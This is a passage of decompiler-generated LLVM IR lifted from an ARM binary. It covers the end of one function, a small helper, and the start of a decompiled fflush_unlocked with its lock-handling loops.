  %v3_17af864 = icmp uge i32 %v2_17af462, %v2_17ae8
  store i1 %v3_17af864, i1* %cpsr_c.global-to-local, align 1
  %v9_17af870 = icmp eq i32 %v2_17af462, %v2_17ae8
  br i1 %v9_17af870, label %dec_label_pc_17b00, label %dec_label_pc_17b18

dec_label_pc_17b00:                               ; preds = %dec_label_pc_17ae8, %dec_label_pc_17b00.dec_label_pc_17af4_crit_edge
  %v0_17b0071 = phi i32 [ %v1_17af8.pre, %dec_label_pc_17b00.dec_label_pc_17af4_crit_edge ], [ %v2_17ae8, %dec_label_pc_17ae8 ]
  store i32 %v0_17b0071, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_17b10 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_17b10, label %dec_label_pc_17b14, label %dec_label_pc_17b00.dec_label_pc_17af4_crit_edge

dec_label_pc_17b00.dec_label_pc_17af4_crit_edge:  ; preds = %dec_label_pc_17b00
  %v0_17af4.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_17af8.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_17af4 = inttoptr i32 %v0_17af4.pre to i32*
  %v2_17af4 = load i32, i32* %v1_17af4, align 4
  store i32 %v2_17af4, i32* %r3.global-to-local, align 4
  %v3_17af8 = icmp uge i32 %v2_17af4, %v1_17af8.pre
  store i1 %v3_17af8, i1* %cpsr_c.global-to-local, align 1
  %v9_17af8 = icmp eq i32 %v2_17af4, %v1_17af8.pre
  br i1 %v9_17af8, label %dec_label_pc_17b00, label %dec_label_pc_17b18

dec_label_pc_17b14:                               ; preds = %dec_label_pc_17b00
  %v0_17b14 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_17b14, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_17b18

dec_label_pc_17b18:                               ; preds = %dec_label_pc_17ae8, %dec_label_pc_17b00.dec_label_pc_17af4_crit_edge, %dec_label_pc_17b14
  %v0_17b20 = phi i32 [ %v0_17b14, %dec_label_pc_17b14 ], [ %v2_17af462, %dec_label_pc_17ae8 ], [ %v2_17af4, %dec_label_pc_17b00.dec_label_pc_17af4_crit_edge ]
  %v1_17b18 = phi i32 [ %v0_17b14, %dec_label_pc_17b14 ], [ %v2_17ae8, %dec_label_pc_17ae8 ], [ %v1_17af8.pre, %dec_label_pc_17b00.dec_label_pc_17af4_crit_edge ]
  %v3_17b18 = icmp uge i32 %v0_17b20, %v1_17b18
  store i1 %v3_17b18, i1* %cpsr_c.global-to-local, align 1
  %v9_17b18 = icmp eq i32 %v0_17b20, %v1_17b18
  br i1 %v9_17b18, label %dec_label_pc_17b20, label %dec_label_pc_17b18.dec_label_pc_17ae8_crit_edge

dec_label_pc_17b18.dec_label_pc_17ae8_crit_edge:  ; preds = %dec_label_pc_17b18
  %v0_17ae8.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_17ae8

dec_label_pc_17b20:                               ; preds = %dec_label_pc_17b18
  %v2_17b20 = icmp ne i32 %v1_17b18, 0
  store i1 %v2_17b20, i1* %cpsr_c.global-to-local, align 1
  %v7_17b24 = icmp slt i32 %v1_17b18, 2
  br i1 %v7_17b24, label %dec_label_pc_17b40, label %dec_label_pc_17b28

dec_label_pc_17b28:                               ; preds = %dec_label_pc_17b20
  %v0_17b28 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_17b28, i32* %r0.global-to-local, align 4
  %v0_17b2c = load i32, i32* %r1.global-to-local, align 4
  %v1_17b2c = add i32 %v0_17b2c, 129
  store i32 %v1_17b2c, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_17b40

dec_label_pc_17b40:                               ; preds = %dec_label_pc_17ab0, %dec_label_pc_17b28, %dec_label_pc_17b20
  %v2_17b44 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_17b44, i32* %r4.global-to-local, align 4
  %v1_17b48 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_17b48

; uselistorder directives
  uselistorder i32 %v0_17b14, { 1, 0, 2 }
  uselistorder i32 %v1_17af8.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_17ae8, { 1, 0 }
  uselistorder i32 %v0_17a74, { 1, 0, 2 }
  uselistorder i32 %v1_17a58.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_17a48, { 1, 0 }
  uselistorder i32 %v0_17a14, { 2, 1, 0 }
  uselistorder i32 %v0_179b8, { 1, 0 }
  uselistorder i32 %v0_1799c, { 1, 0, 2 }
  uselistorder i32 %v1_17980.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v1_1796c, { 1, 0 }
  uselistorder i32 %v0_17910, { 1, 0, 2 }
  uselistorder i32 %v1_178f4.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v4_178c8, { 2, 1, 0, 3 }
  uselistorder i32* %r7.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 11, 10, 12, 14, 13, 15 }
  uselistorder i32* %r6.global-to-local, { 5, 6, 0, 1, 2, 3, 4 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 2, 3, 6, 4, 5, 7 }
  uselistorder i32* %r4.global-to-local, { 0, 2, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 5, 4, 1, 6, 7, 8, 9, 10, 11, 12, 14, 13, 0, 15, 16, 17, 43, 44, 18, 19, 20, 21, 22, 23, 24, 26, 25, 42, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 38, 37, 41, 39, 40 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 4, 3, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 8, 7, 12, 9, 10, 11 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1, 3, 5, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18 }
  uselistorder i1* %cpsr_c.global-to-local, { 3, 4, 6, 5, 2, 7, 8, 9, 11, 10, 1, 12, 15, 13, 14, 25, 16, 17, 26, 27, 18, 19, 20, 21, 23, 22, 0, 24 }
  uselistorder i32 8192, { 3, 0, 1, 2 }
  uselistorder i32 47, { 2, 0, 7, 3, 4, 5, 6, 1 }
  uselistorder i32 32816, { 2, 0, 1 }
  uselistorder label %dec_label_pc_17b40, { 1, 2, 0 }
  uselistorder label %dec_label_pc_17b18, { 2, 1, 0 }
  uselistorder label %dec_label_pc_17b00, { 1, 0 }
  uselistorder label %dec_label_pc_17ab0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_17aa0, { 1, 2, 0 }
  uselistorder label %dec_label_pc_17a78, { 2, 1, 0 }
  uselistorder label %dec_label_pc_17a60, { 1, 0 }
  uselistorder label %dec_label_pc_17a14, { 1, 0 }
  uselistorder label %bb52, { 1, 0 }
  uselistorder label %bb50, { 1, 0 }
  uselistorder label %dec_label_pc_179dc, { 1, 0 }
  uselistorder label %dec_label_pc_179b0, { 1, 0 }
  uselistorder label %bb48, { 1, 0 }
  uselistorder label %dec_label_pc_179a0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_17988, { 1, 0 }
  uselistorder label %dec_label_pc_17924, { 1, 0 }
  uselistorder label %bb45, { 1, 0 }
  uselistorder label %dec_label_pc_17914, { 2, 1, 0 }
  uselistorder label %dec_label_pc_178fc, { 1, 0 }
}

define i32 @function_17b50(i32 %arg1) local_unnamed_addr {
dec_label_pc_17b50:
  %v0_17b50 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_17b50, label %bb, label %.thread4

bb:                                               ; preds = %dec_label_pc_17b50
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_17b50, %bb
  %v10_17b64 = phi i32 [ %arg1, %dec_label_pc_17b50 ], [ 0, %bb ]
  ret i32 %v10_17b64

; uselistorder directives
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @fflush_unlocked(i16* %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v6_17b68 = load i32, i32* @r5, align 4
  store i32 76, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_23010.367 to i32), i32* @r6, align 4
  %v4_17b78 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.367 to i32), i32 76) to i32*), align 4
  store i32 %v4_17b78, i32* %r3.global-to-local, align 4
  %v4_17b7c = icmp uge i32 %tmp, %v4_17b78
  store i1 %v4_17b7c, i1* %cpsr_c.global-to-local, align 1
  %v10_17b7c = icmp eq i32 %tmp, %v4_17b78
  br i1 %v10_17b7c, label %bb, label %dec_label_pc_17b94

bb:                                               ; preds = %entry
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 %tmp, i32* @r4, align 4
  br label %dec_label_pc_17ba4

dec_label_pc_17b94:                               ; preds = %entry
  store i32 %tmp, i32* @r4, align 4
  store i32 256, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v3_17b98 = icmp eq i16* %arg1, null
  br i1 %v3_17b98, label %dec_label_pc_17ba4, label %dec_label_pc_17eb8

dec_label_pc_17ba4:                               ; preds = %bb, %dec_label_pc_17b94
  %stack_var_-44.1 = phi i32 [ 0, %bb ], [ 256, %dec_label_pc_17b94 ]
  store i32 160, i32* %r3.global-to-local, align 4
  %v4_17ba8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.367 to i32), i32 160) to i32*), align 4
  store i32 %v4_17ba8, i32* %r5.global-to-local, align 4
  %v0_17bac = call i32 @__aeabi_read_tp()
  store i32 %v0_17bac, i32* %r0.global-to-local, align 4
  %v1_17bb0 = add i32 %v4_17ba8, 8
  %v2_17bb0 = inttoptr i32 %v1_17bb0 to i32*
  %v3_17bb0 = load i32, i32* %v2_17bb0, align 4
  store i32 %v3_17bb0, i32* %r3.global-to-local, align 4
  %v1_17bb4 = add i32 %v0_17bac, -1168
  store i32 %v1_17bb4, i32* %r8.global-to-local, align 4
  %v3_17bb8 = icmp uge i32 %v3_17bb0, %v1_17bb4
  store i1 %v3_17bb8, i1* %cpsr_c.global-to-local, align 1
  %v9_17bb8 = icmp eq i32 %v3_17bb0, %v1_17bb4
  br i1 %v9_17bb8, label %dec_label_pc_17c00, label %dec_label_pc_17bc0

dec_label_pc_17bc0:                               ; preds = %dec_label_pc_17ba4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v4_17ba8, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v1_17bcc143 = inttoptr i32 %v4_17ba8 to i32*
  %v2_17bcc144 = load i32, i32* %v1_17bcc143, align 4
  store i32 %v2_17bcc144, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_17bd0146 = icmp eq i32 %v2_17bcc144, 0
  br i1 %v9_17bd0146, label %dec_label_pc_17bd8, label %dec_label_pc_17bf0

dec_label_pc_17bd8:                               ; preds = %dec_label_pc_17bc0, %dec_label_pc_17bd8.dec_label_pc_17bcc_crit_edge
  %v0_17bd8147 = phi i32 [ %v1_17bd0.pre, %dec_label_pc_17bd8.dec_label_pc_17bcc_crit_edge ], [ 0, %dec_label_pc_17bc0 ]
  store i32 %v0_17bd8147, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_17be8 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_17be8, label %dec_label_pc_17bec, label %dec_label_pc_17bd8.dec_label_pc_17bcc_crit_edge

dec_label_pc_17bd8.dec_label_pc_17bcc_crit_edge:  ; preds = %dec_label_pc_17bd8
  %v0_17bcc.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_17bd0.pre = load i32, i32* @r4, align 4
  %v1_17bcc = inttoptr i32 %v0_17bcc.pre to i32*
  %v2_17bcc = load i32, i32* %v1_17bcc, align 4
  store i32 %v2_17bcc, i32* %r3.global-to-local, align 4
  %v3_17bd0 = icmp uge i32 %v2_17bcc, %v1_17bd0.pre
  store i1 %v3_17bd0, i1* %cpsr_c.global-to-local, align 1
  %v9_17bd0 = icmp eq i32 %v2_17bcc, %v1_17bd0.pre
  br i1 %v9_17bd0, label %dec_label_pc_17bd8, label %dec_label_pc_17bf0

dec_label_pc_17bec:                               ; preds = %dec_label_pc_17bd8
  %v0_17bec = load i32, i32* @r4, align 4
  store i32 %v0_17bec, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_17bf0

dec_label_pc_17bf0:                               ; preds = %dec_label_pc_17bc0, %dec_label_pc_17bd8.dec_label_pc_17bcc_crit_edge, %dec_label_pc_17bec
  %v0_17bf0 = phi i32 [ %v0_17bec, %dec_label_pc_17bec ], [ %v2_17bcc144, %dec_label_pc_17bc0 ], [ %v2_17bcc, %dec_label_pc_17bd8.dec_label_pc_17bcc_crit_edge ]
  %v1_17bf0 = phi i32 [ %v0_17bec, %dec_label_pc_17bec ], [ 0, %dec_label_pc_17bc0 ], [ %v1_17bd0.pre, %dec_label_pc_17bd8.dec_label_pc_17bcc_crit_edge ]
  %v3_17bf0 = icmp uge i32 %v0_17bf0, %v1_17bf0
  store i1 %v3_17bf0, i1* %cpsr_c.global-to-local, align 1
  %v9_17bf0 = icmp eq i32 %v0_17bf0, %v1_17bf0
  br i1 %v9_17bf0, label %bb66, label %bb65

bb65:                                             ; preds = %dec_label_pc_17bf0
  %v1_17bf4 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v1_17bf4, i32* %r0.global-to-local, align 4
  br label %bb66

bb66:                                             ; preds = %dec_label_pc_17bf0, %bb65
  %v1_17bf8 = xor i1 %v9_17bf0, true
  call void @__pseudo_cond_branch(i1 %v1_17bf8, i32 ptrtoint (i32* @global_var_154bc.522 to i32))
  %v0_17bfc = load i32, i32* %r8.global-to-local, align 4
  %v1_17bfc = load i32, i32* %r5.global-to-local, align 4
  %v2_17bfc = add i32 %v1_17bfc, 8
  %v3_17bfc = inttoptr i32 %v2_17bfc to i32*
  store i32 %v0_17bfc, i32* %v3_17bfc, align 4
  br label %dec_label_pc_17c00

dec_label_pc_17c00:                               ; preds = %dec_label_pc_17ba4, %bb66
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_17c04 = load i32, i32* @r6, align 4
  %v2_17c04 = add i32 %v0_17c04, 160
  %v3_17c04 = inttoptr i32 %v2_17c04 to i32*
  %v4_17c04 = load i32, i32* %v3_17c04, align 4
  store i32 %v4_17c04, i32* %r0.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_17c0c = add i32 %v0_17c04, 12
  %v3_17c0c = inttoptr i32 %v2_17c0c to i32*
  %v4_17c0c = load i32, i32* %v3_17c0c, align 4
  store i32 %v4_17c0c, i32* %r2.global-to-local, align 4
  %v1_17c10 = add i32 %v4_17c04, 4
  %v2_17c10 = inttoptr i32 %v1_17c10 to i32*
  %v3_17c10 = load i32, i32* %v2_17c10, align 4
  store i32 %v3_17c10, i32* %r1.global-to-local, align 4
  %v1_17c14 = inttoptr i32 %v4_17c0c to i32*
  %v2_17c14 = load i32, i32* %v1_17c14, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_17c18 = icmp eq i32 %v3_17c10, 0
  %v1_17c1c = add i32 %v2_17c14, 1
  store i32 %v1_17c1c, i32* %r3.global-to-local, align 4
  store i32 %v1_17c1c, i32* %v1_17c14, align 4
  br i1 %v2_17c18, label %dec_label_pc_17c28, label %dec_label_pc_17c88

dec_label_pc_17c28:                               ; preds = %dec_label_pc_17c00
  %v0_17c28 = load i32, i32* %r1.global-to-local, align 4
  %v1_17c28 = load i32, i32* %r0.global-to-local, align 4
  %v2_17c28 = add i32 %v1_17c28, 8
  %v3_17c28 = inttoptr i32 %v2_17c28 to i32*
  store i32 %v0_17c28, i32* %v3_17c28, align 4
  %v0_17c2c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_17c2c, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_17c30

dec_label_pc_17c30:                               ; preds = %dec_label_pc_17c60.dec_label_pc_17c30_crit_edge, %dec_label_pc_17c28
  %v0_17c30 = phi i32 [ %v0_17c30.pre, %dec_label_pc_17c60.dec_label_pc_17c30_crit_edge ], [ %v0_17c2c, %dec_label_pc_17c28 ]
  %v1_17c30 = inttoptr i32 %v0_17c30 to i32*
  %v2_17c30 = load i32, i32* %v1_17c30, align 4
  store i32 %v2_17c30, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_17c30, i32* %r2.global-to-local, align 4
  %v2_17c3c131 = load i32, i32* %v1_17c30, align 4
  store i32 %v2_17c3c131, i32* %r3.global-to-local, align 4
  %v3_17c40133 = icmp uge i32 %v2_17c3c131, %v2_17c30
  store i1 %v3_17c40133, i1* %cpsr_c.global-to-local, align 1
  %v9_17c40139 = icmp eq i32 %v2_17c3c131, %v2_17c30
  br i1 %v9_17c40139, label %dec_label_pc_17c48, label %dec_label_pc_17c60

dec_label_pc_17c48:                               ; preds = %dec_label_pc_17c30, %dec_label_pc_17c48.dec_label_pc_17c3c_crit_edge
  %v0_17c48140 = phi i32 [ %v1_17c40.pre, %dec_label_pc_17c48.dec_label_pc_17c3c_crit_edge ], [ %v2_17c30, %dec_label_pc_17c30 ]
  store i32 %v0_17c48140, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_17c58 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_17c58, label %dec_label_pc_17c5c, label %dec_label_pc_17c48.dec_label_pc_17c3c_crit_edge

dec_label_pc_17c48.dec_label_pc_17c3c_crit_edge:  ; preds = %dec_label_pc_17c48
  %v0_17c3c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_17c40.pre = load i32, i32* @r4, align 4
  %v1_17c3c = inttoptr i32 %v0_17c3c.pre to i32*
  %v2_17c3c = load i32, i32* %v1_17c3c, align 4
  store i32 %v2_17c3c, i32* %r3.global-to-local, align 4
  %v3_17c40 = icmp uge i32 %v2_17c3c, %v1_17c40.pre
  store i1 %v3_17c40, i1* %cpsr_c.global-to-local, align 1
  %v9_17c40 = icmp eq i32 %v2_17c3c, %v1_17c40.pre
  br i1 %v9_17c40, label %dec_label_pc_17c48, label %dec_label_pc_17c60

dec_label_pc_17c5c:                               ; preds = %dec_label_pc_17c48
  %v0_17c5c = load i32, i32* @r4, align 4
  store i32 %v0_17c5c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_17c60

dec_label_pc_17c60:                               ; preds = %dec_label_pc_17c30, %dec_label_pc_17c48.dec_label_pc_17c3c_crit_edge, %dec_label_pc_17c5c
  %v0_17c68 = phi i32 [ %v0_17c5c, %dec_label_pc_17c5c ], [ %v2_17c3c131, %dec_label_pc_17c30 ], [ %v2_17c3c, %dec_label_pc_17c48.dec_label_pc_17c3c_crit_edge ]
  %v1_17c60 = phi i32 [ %v0_17c5c, %dec_label_pc_17c5c ], [ %v2_17c30, %dec_label_pc_17c30 ], [ %v1_17c40.pre, %dec_label_pc_17c48.dec_label_pc_17c3c_crit_edge ]
  %v3_17c60 = icmp uge i32 %v0_17c68, %v1_17c60
  store i1 %v3_17c60, i1* %cpsr_c.global-to-local, align 1
  %v9_17c60 = icmp eq i32 %v0_17c68, %v1_17c60
  br i1 %v9_17c60, label %dec_label_pc_17c68, label %dec_label_pc_17c60.dec_label_pc_17c30_crit_edge

dec_label_pc_17c60.dec_label_pc_17c30_crit_edge:  ; preds = %dec_label_pc_17c60
  %v0_17c30.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_17c30

dec_label_pc_17c68:                               ; preds = %dec_label_pc_17c60
  %v2_17c68 = icmp ne i32 %v1_17c60, 0
  store i1 %v2_17c68, i1* %cpsr_c.global-to-local, align 1
  %v7_17c6c = icmp slt i32 %v1_17c60, 2
  br i1 %v7_17c6c, label %dec_label_pc_17c88, label %dec_label_pc_17c70

dec_label_pc_17c70:                               ; preds = %dec_label_pc_17c68
  %v0_17c70 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_17c70, i32* %r0.global-to-local, align 4
  %v0_17c74 = load i32, i32* %r1.global-to-local, align 4
  %v1_17c74 = add i32 %v0_17c74, 129
  store i32 %v1_17c74, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_17c88

dec_label_pc_17c88:                               ; preds = %dec_label_pc_17c00, %dec_label_pc_17c70, %dec_label_pc_17c68
  store i32 152, i32* %r3.global-to-local, align 4
  %v0_17c8c = load i32, i32* @r6, align 4
  %v2_17c8c = add i32 %v0_17c8c, 152
  %v3_17c8c = inttoptr i32 %v2_17c8c to i32*
  %v4_17c8c = load i32, i32* %v3_17c8c, align 4
  store i32 %v4_17c8c, i32* %r5.global-to-local, align 4
  %v1_17c90 = add i32 %v4_17c8c, 8
  %v2_17c90 = inttoptr i32 %v1_17c90 to i32*
  %v3_17c90 = load i32, i32* %v2_17c90, align 4
  store i32 %v3_17c90, i32* %r3.global-to-local, align 4
  %v1_17c94 = load i32, i32* %r8.global-to-local, align 4
  %v3_17c94 = icmp uge i32 %v3_17c90, %v1_17c94
  store i1 %v3_17c94, i1* %cpsr_c.global-to-local, align 1
  %v9_17c94 = icmp eq i32 %v3_17c90, %v1_17c94
  br i1 %v9_17c94, label %dec_label_pc_17cdc, label %dec_label_pc_17c9c

dec_label_pc_17c9c:                               ; preds = %dec_label_pc_17c88
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v4_17c8c, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v1_17ca8123 = inttoptr i32 %v4_17c8c to i32*
  %v2_17ca8124 = load i32, i32* %v1_17ca8123, align 4
  store i32 %v2_17ca8124, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_17cac126 = icmp eq i32 %v2_17ca8124, 0
  br i1 %v9_17cac126, label %dec_label_pc_17cb4, label %dec_label_pc_17ccc

dec_label_pc_17cb4:                               ; preds = %dec_label_pc_17c9c, %dec_label_pc_17cb4.dec_label_pc_17ca8_crit_edge
  %v0_17cb4127 = phi i32 [ %v1_17cac.pre, %dec_label_pc_17cb4.dec_label_pc_17ca8_crit_edge ], [ 0, %dec_label_pc_17c9c ]
  store i32 %v0_17cb4127, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_17cc4 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_17cc4, label %dec_label_pc_17cc8, label %dec_label_pc_17cb4.dec_label_pc_17ca8_crit_edge

dec_label_pc_17cb4.dec_label_pc_17ca8_crit_edge:  ; preds = %dec_label_pc_17cb4
  %v0_17ca8.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_17cac.pre = load i32, i32* @r4, align 4
  %v1_17ca8 = inttoptr i32 %v0_17ca8.pre to i32*
  %v2_17ca8 = load i32, i32* %v1_17ca8, align 4
  store i32 %v2_17ca8, i32* %r3.global-to-local, align 4
  %v3_17cac = icmp uge i32 %v2_17ca8, %v1_17cac.pre
  store i1 %v3_17cac, i1* %cpsr_c.global-to-local, align 1
  %v9_17cac = icmp eq i32 %v2_17ca8, %v1_17cac.pre
  br i1 %v9_17cac, label %dec_label_pc_17cb4, label %dec_label_pc_17ccc

dec_label_pc_17cc8:                               ; preds = %dec_label_pc_17cb4
  %v0_17cc8 = load i32, i32* @r4, align 4
  store i32 %v0_17cc8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_17ccc

dec_label_pc_17ccc:                               ; preds = %dec_label_pc_17c9c, %dec_label_pc_17cb4.dec_label_pc_17ca8_crit_edge, %dec_label_pc_17cc8
  %v0_17ccc = phi i32 [ %v0_17cc8, %dec_label_pc_17cc8 ], [ %v2_17ca8124, %dec_label_pc_17c9c ], [ %v2_17ca8, %dec_label_pc_17cb4.dec_label_pc_17ca8_crit_edge ]
  %v1_17ccc = phi i32 [ %v0_17cc8, %dec_label_pc_17cc8 ], [ 0, %dec_label_pc_17c9c ], [ %v1_17cac.pre, %dec_label_pc_17cb4.dec_label_pc_17ca8_crit_edge ]
  %v3_17ccc = icmp uge i32 %v0_17ccc, %v1_17ccc
  store i1 %v3_17ccc, i1* %cpsr_c.global-to-local, align 1
  %v9_17ccc = icmp eq i32 %v0_17ccc, %v1_17ccc
  br i1 %v9_17ccc, label %bb68, label %bb67

bb67:                                             ; preds = %dec_label_pc_17ccc
  %v1_17cd0 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v1_17cd0, i32* %r0.global-to-local, align 4
  br label %bb68

bb68:                                             ; preds = %dec_label_pc_17ccc, %bb67
  %v1_17cd4 = xor i1 %v9_17ccc, true
  call void @__pseudo_cond_branch(i1 %v1_17cd4, i32 ptrtoint (i32* @global_var_154bc.522 to i32))
  %v0_17cd8 = load i32, i32* %r8.global-to-local, align 4
  %v1_17cd8 = load i32, i32* %r5.global-to-local, align 4
  %v2_17cd8 = add i32 %v1_17cd8, 8
  %v3_17cd8 = inttoptr i32 %v2_17cd8 to i32*
  store i32 %v0_17cd8, i32* %v3_17cd8, align 4
  %v0_17ce0.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_17cdc

dec_label_pc_17cdc:                               ; preds = %dec_label_pc_17c88, %bb68
  %v0_17cec = phi i32 [ %v0_17c8c, %dec_label_pc_17c88 ], [ %v0_17ce0.pre, %bb68 ]
  store i32 152, i32* %r3.global-to-local, align 4
  %v2_17ce0 = add i32 %v0_17cec, 152
  %v3_17ce0 = inttoptr i32 %v2_17ce0 to i32*
  %v4_17ce0 = load i32, i32* %v3_17ce0, align 4
  store i32 %v4_17ce0, i32* %r0.global-to-local, align 4
  store i32 76, i32* %r3.global-to-local, align 4
  %v1_17ce8 = add i32 %v4_17ce0, 4
  %v2_17ce8 = inttoptr i32 %v1_17ce8 to i32*
  %v3_17ce8 = load i32, i32* %v2_17ce8, align 4
  store i32 %v3_17ce8, i32* %r1.global-to-local, align 4
  %v2_17cec = add i32 %v0_17cec, 76
  %v3_17cec = inttoptr i32 %v2_17cec to i32*
  %v4_17cec = load i32, i32* %v3_17cec, align 4
  store i32 %v4_17cec, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_17cf0 = icmp eq i32 %v3_17ce8, 0
  %v1_17cf4 = inttoptr i32 %v4_17cec to i32*
  %v2_17cf4 = load i32, i32* %v1_17cf4, align 4
  store i32 %v2_17cf4, i32* @r5, align 4
  br i1 %v2_17cf0, label %dec_label_pc_17cfc, label %dec_label_pc_17d5c

dec_label_pc_17cfc:                               ; preds = %dec_label_pc_17cdc
  %v2_17cfc = add i32 %v4_17ce0, 8
  %v3_17cfc = inttoptr i32 %v2_17cfc to i32*
  store i32 0, i32* %v3_17cfc, align 4
  %v0_17d00 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_17d00, i32* @r7, align 4
  br label %dec_label_pc_17d04

dec_label_pc_17d04:                               ; preds = %dec_label_pc_17d34.dec_label_pc_17d04_crit_edge, %dec_label_pc_17cfc
  %v0_17d04 = phi i32 [ %v0_17d04.pre, %dec_label_pc_17d34.dec_label_pc_17d04_crit_edge ], [ %v0_17d00, %dec_label_pc_17cfc ]
  %v1_17d04 = inttoptr i32 %v0_17d04 to i32*
  %v2_17d04 = load i32, i32* %v1_17d04, align 4
  store i32 %v2_17d04, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_17d04, i32* %r2.global-to-local, align 4
  %v2_17d10111 = load i32, i32* %v1_17d04, align 4
  store i32 %v2_17d10111, i32* %r3.global-to-local, align 4
  %v3_17d14113 = icmp uge i32 %v2_17d10111, %v2_17d04
  store i1 %v3_17d14113, i1* %cpsr_c.global-to-local, align 1
  %v9_17d14119 = icmp eq i32 %v2_17d10111, %v2_17d04
  br i1 %v9_17d14119, label %dec_label_pc_17d1c, label %dec_label_pc_17d34

dec_label_pc_17d1c:                               ; preds = %dec_label_pc_17d04, %dec_label_pc_17d1c.dec_label_pc_17d10_crit_edge
  %v0_17d1c120 = phi i32 [ %v1_17d14.pre, %dec_label_pc_17d1c.dec_label_pc_17d10_crit_edge ], [ %v2_17d04, %dec_label_pc_17d04 ]
  store i32 %v0_17d1c120, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_17d2c = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_17d2c, label %dec_label_pc_17d30, label %dec_label_pc_17d1c.dec_label_pc_17d10_crit_edge

dec_label_pc_17d1c.dec_label_pc_17d10_crit_edge:  ; preds = %dec_label_pc_17d1c
